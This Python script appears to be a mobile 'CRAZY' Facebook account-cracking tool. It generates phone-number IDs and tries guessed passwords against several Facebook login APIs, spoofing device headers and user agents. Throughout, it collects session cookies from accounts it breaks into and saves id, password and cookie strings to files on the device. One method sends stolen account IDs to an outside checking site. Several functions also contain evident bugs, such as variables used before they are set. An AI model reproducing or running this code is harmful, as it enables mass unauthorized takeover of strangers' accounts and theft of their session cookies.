		print(f"{B}|{G}×{B}|{W} Sim Code  ━➤{G} {code} {B}|{G}×{B}|{W} Total Uid ━➤{G} {tl}");linex()
		for love in user:
			ids = code + love 
			pasx = ['57575751','57273200','59039200',ids,love,ids[3:]]
			if methd in ['1']:CRAZYx.submit(__M1__,ids,pasx,tl)
			if methd in ['2']:CRAZYx.submit(__M2__,ids,pasx,tl)
			if methd in ['3']:CRAZYx.submit(__M3__,ids,pasx,tl)
			if methd in ['4']:CRAZYx.submit(__M4__,ids,pasx,tl)
			if methd in ['5']:CRAZYx.submit(__M5__,ids,pasx,tl)
	print("");linex();print(f'{B}|{G}×{B}|{W} The Cracking Has Been Complete...');print(f'{B}|{G}×{B}|{W} Total Ok Uid ━➤ {str(len(ok))}');print(f'{B}|{G}×{B}|{W} Total Cp Uid ━➤ {str(len(cp))}');linex();exit()
#-------------------------< FILE METHOD F1 >--------------------------#
def ____M1____(ids,names,passlist):
        try:
                global loop,oks,cps
                xd=f"{B}|{G}×{B}|{W}"
                xdx=f"{B}|{W}CRAZY-S1{B}|{W}"
                oh=random.choice([W,G,B,Y])
                sys.stdout.write(f'\r\r{xd}-{xdx} {oh}{loop} {B}|{G}{len(ok)}{B}|{W}-{B}|{Y}{len(cp)}{B}|{W} ');sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ___uaaa1___(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r{B}|{G}CRAZY-OK{B}|{G} {str(ids)} | {pas} ')
                                        print(f'\r\r{B}|{G}COOKIES{B}|{W}━➤ {coki} ')
                                        open('/sdcard/CRAZY-FILE-F1-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        ok.append(str(ids))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}|{Y}CRAZY-CP{B}|{Y} {str(ids)} | {pas} ')
                                                open('/sdcard/CRAZY-FILE-F1-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cp.append(str(ids))
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#-------------------------< FILE METHOD S2 >--------------------------#
def ____M2____(ids,names,passlist):
        try:
                global loop,oks,cps
                xd=f"{B}|{G}×{B}|{W}"
                xdx=f"{B}|{W}CRAZY-S2{B}|{W}"
                oh=random.choice([W,G,B,Y])
                sys.stdout.write(f'\r\r{xd}-{xdx} {oh}{loop} {B}|{G}{len(ok)}{B}|{W}-{B}|{Y}{len(cp)}{B}|{W} ');sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        data={"adid": adid,"format": "json","device_id": str(uuid.uuid4()),"email": ids,"password": pas,"generate_analytics_claims": "1","credentials_type": "password","source": "login","error_detail_type": "button_with_disabled","enroll_misauth": "false","generate_session_cookies": "1","generate_machine_id": "1","fb_api_req_friendly_name": "authenticate",}
                        headers = {"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","User-Agent": ___uaaa1___(),"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","X-FB-Friendly-Name": "authenticate","X-FB-Connection-Type": "unknown","Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r{B}|{G}CRAZY-OK{B}|{G} {str(ids)} | {pas} ')
                                        print(f'\r\r{B}|{G}COOKIES{B}|{W}━➤ {coki} ')
                                        open('/sdcard/CRAZY-FILE-S2-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        ok.append(str(ids))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}|{Y}CRAZY-CP{B}|{Y} {str(ids)} | {pas} ')
                                                open('/sdcard/CRAZY-FILE-S2-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cp.append(str(ids))
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#-------------------------< FILE METHOD F3 >--------------------------#
def ____M3____(ids,names,passlist):
        try:
                global loop,oks,cps
                xd=f"{B}|{G}×{B}|{W}"
                xdx=f"{B}|{W}CRAZY-S3{B}|{W}"
                oh=random.choice([W,G,B,Y])
                sys.stdout.write(f'\r\r{xd}-{xdx} {oh}{loop} {B}|{G}{len(ok)}{B}|{W}-{B}|{Y}{len(cp)}{B}|{W} ');sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data={
                                "access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
                                "sdk_version": {random.randint(1,26)}, 
                                "email": ids,
                                "password": pas,
                                "sdk": "android",
                                "locale": "en_US",
                                "generate_session_cookies": "1",
                                "sig": "c1e620fa708a1d5696fb991c1bde5662"
                        }
                        headers = {
                                "Host": "graph.facebook.com",
                                "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
                                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                                "x-fb-net-hni": str(random.randint(20000, 40000)),
                                "x-fb-connection-quality": "EXCELLENT",
                                "user-agent":___uaaa1___(),
                                "content-type": "application/x-www-form-urlencoded",
                                "x-fb-http-engine": "Liger"
                        }
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r{B}|{G}CRAZY-OK{B}|{G} {str(ids)} | {pas} ')
                                        print(f'\r\r{B}|{G}COOKIES{B}|{W}━➤ {coki} ')
                                        open('/sdcard/CRAZY-FILE-F3-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        ok.append(str(ids))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}|{Y}CRAZY-CP{B}|{Y} {str(ids)} | {pas} ')
                                                open('/sdcard/CRAZY-FILE-F3-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cp.append(str(ids))
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#-------------------------< FILE METHOD F4 >--------------------------#
def ____M4____(ids,names,passlist):
        try:
                global loop,oks,cps
                xd=f"{B}|{G}×{B}|{W}"
                xdx=f"{B}|{W}CRAZY-S4{B}|{W}"
                oh=random.choice([W,G,B,Y])
                sys.stdout.write(f'\r\r{xd}-{xdx} {oh}{loop} {B}|{G}{len(ok)}{B}|{W}-{B}|{Y}{len(cp)}{B}|{W} ');sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        data={"adid": adid,"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839","currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers = {'User-Agent': ___uaaa1___(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(3e7,4e7)),'X-FB-SIM-HNI': str(random.randint(2e4,4e4)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '706'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r{B}|{G}CRAZY-OK{B}|{G} {str(ids)} | {pas} ')
                                        print(f'\r\r{B}|{G}COOKIES{B}|{W}━➤ {coki} ')
                                        open('/sdcard/CRAZY-FILE-F4-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        ok.append(str(ids))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}|{Y}CRAZY-CP{B}|{Y} {str(ids)} | {pas} ')
                                                open('/sdcard/CRAZY-FILE-F4-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cp.append(str(ids))
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#-------------------------< RANDOM METHOD R1 >--------------------------#
def __M1__(ids,pasx,tl):
        global loop,ok
        xd=f"{B}|{G}×{B}|{W}"
        xdx=f"{B}|{W}CRAZY-S1{B}|{W}"
        oh=random.choice([W,G,B,Y])
        sys.stdout.write(f'\r\r{xd}-{xdx} {oh}{loop} {B}|{G}{len(ok)}{B}|{W}-{B}|{Y}{len(cp)}{B}|{W} ');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        user_agentox = f"Dalvik/2.1.0 Linux; U; Android "+str(random.randrange(5,14))+"; "+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+" Build/QP1A."+str(random.randrange(111111,999999))+") [FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["Xiaomi","xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
                        data={"adid": adid,"format": "json","device_id": str(uuid.uuid4()),"email": ids,"password": pas,"generate_analytics_claims": "1","credentials_type": "password","source": "login","error_detail_type": "button_with_disabled","enroll_misauth": "false","generate_session_cookies": "1","generate_machine_id": "1","fb_api_req_friendly_name": "authenticate",}
                        headers = {"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","User-Agent": ___uaa___(),"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","X-FB-Friendly-Name": "authenticate","X-FB-Connection-Type": "unknown","Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                response = str(requests.get(f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={uid}").text)
                                if "LIVE" in response:
                                	print(f'\r\r{B}|{G}CRAZY-OK{B}|{G} {str(uid)} | {pas} ')
                                	print(f'\r\r{B}|{G}COOKIES{B}|{P}━➤ {coki} ')
                                	open('/sdcard/CRAZY-RNDM-R1-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                	ok.append(str(uid))
                                	break
                                else:continue
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                #print(f'\r\r{B}|{Y}CRAZY-CP{B}|{Y} {str(uid)} | {pas} ')
                                open('/sdcard/CRAZY-RNDM-R1-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#-------------------------< RANDOM METHOD R2 >--------------------------#
def __M2__(ids,pasx,tl):
        global loop,ok
        xd=f"{B}|{G}×{B}|{W}"
        xdx=f"{B}|{W}CRAZY-S2{B}|{W}"
        oh=random.choice([W,G,B,Y])
        sys.stdout.write(f'\r\r{xd}-{xdx} {oh}{loop} {B}|{G}{len(ok)}{B}|{W}-{B}|{Y}{len(cp)}{B}|{W} ');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': ___uaa1___(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                kankir_pola = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
                                if "Photoshop" in kankir_pola:
                                	print(f'\r\r{B}|{G}CRAZY-OK{B}|{G} {str(uid)} | {pas} ')
                                	print(f'\r\r{B}|{G}COOKIES{B}|{W}━➤ {coki} ')
                                	linex()
                                	open('/sdcard/CRAZY-RNDM-R2-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                	ok.append(str(uid))
                                	break
                                else:break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                #print(f'\r\r{B}|{Y}CRAZY-CP{B}|{Y} {str(uid)} | {pas} ')
                                open('/sdcard/CRAZY-RNDM-R2-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#-------------------------< RANDOM METHOD R3 >--------------------------#
def __M3__(ids,pasx,tl):
    global loop,ok,cp
    xd=f"{B}|{G}×{B}|{W}"
    xdx=f"{B}|{W}CRAZY-S3{B}|{W}"
    oh=random.choice([W,G,B,Y])
    sys.stdout.write(f'\r\r{xd}-{xdx} {oh}{loop} {B}|{G}{len(ok)}{B}| ');sys.stdout.flush()
    try:
        for pas in pasx:
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent':___uaa___(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                response = str(requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal').text)
                if 'Photoshop' in response:
                	uid = re.findall('c_user=(.*);xs', kuki)[0]
                	print(f'\r\r{B}|{G}CRAZY-OK{B}|{G} {str(uid)} | {pas} ')
                	print(f'\r\r{B}|{G}COOKIES{B}|{W}━➤ {kuki} ')
                	linex()
                	open('/sdcard/CRAZY-RNDM-R3-OK.txt','a').write(str(uid)+'|'+pas+'|'+kuki+'\n')
                	ok.append(str(uid))
                	break
            else:continue
        loop+=1
    except Exception as e:
        pass
#-------------------------< RANDOM R4 >--------------------------#
def __M4__(ids,pasx,tl):
        global loop,ok
        xd=f"{B}|{G}×{B}|{W}"
        xdx=f"{B}|{W}CRAZY-S4{B}|{W}"
        oh=random.choice([W,G,B,Y])
        sys.stdout.write(f'\r\r{xd}-{xdx} {oh}{loop} {B}|{G}{len(ok)}{B}|{W}-{B}|{Y}{len(cp)}{B}|{W} ');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': ___uaa___(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r{B}|{G}CRAZY-OK{B}|{G} {str(uid)} | {pas} ')
                                print(f'\r\r{B}|{G}COOKIES{B}|{Y}━➤ {coki} ')
                                open('/sdcard/CRAZY-RNDM-R4-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                #print(f'\r\r{B}|{Y}CRAZY-CP{B}|{Y} {str(uid)} | {pas} ')
                                open('/sdcard/CRAZY-RNDM-R4-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#-------------------------< RANDOM METHOD R5 >--------------------------#
def __M5__(ids,pasx,tl):
	global loop,ok,cp
	xd=f"{B}|{G}×{B}|{W}"
	xdx=f"{B}|{W}CRAZY-S5{B}|{W}"
	oh=random.choice([W,G,B,Y])
	sys.stdout.write(f'\r\r{xd}-{xdx} {oh}{loop} {B}|{G}{len(ok)}{B}|{W}-{B}|{Y}{len(cp)}{B}|{W} ');sys.stdout.flush()
	ewe = requests.Session()
	ua = uax()
	for pas in pasx:
		try:
			link = ewe.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),"li": re.search('name="li" value="(.*?)"', str(link)).group(1),"try_number": 0,"unrecognized_tries": 0,"email": ids,"prefill_contact_point": ids,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)}
			headers = {"Host": "mbasic.facebook.com","content-length": str(len((data))),"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),"sec-ch-ua-mobile": "?1","user-agent": ua,"x-response-format": "JSONStream","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"viewport-width": "360","x-requested-with": "XMLHttpRequest","x-asbd-id": "129477","dpr": "2","sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://mbasic.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			response = ewe.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = data,
				headers = headers,
				allow_redirects = False)
			if "checkpoint" in ewe.cookies.get_dict():
				uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				#print(f'\r\r{B}|{Y}CRAZY-CP{B}|{Y} {str(uid)} | {pas} ')
				cp+=1
				open('/sdcard/CRAZY-RNDM-R5-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				break
			elif "c_user" in ewe.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				uid = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r\r{B}|{G}CRAZY-OK{B}|{G} {str(uid)} | {pas} ')
				print(f'\r\r{B}|{G}COOKIES{B}|{W}━➤ {kuki} ')
				linex()
				ok+=1
				open('/sdcard/CRAZY-RNDM-R5-OK.txt','a').write(str(uid)+'|'+pas+'|'+kuki+'\n')
				break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
#-------------------------< END >--------------------------#
____menu____()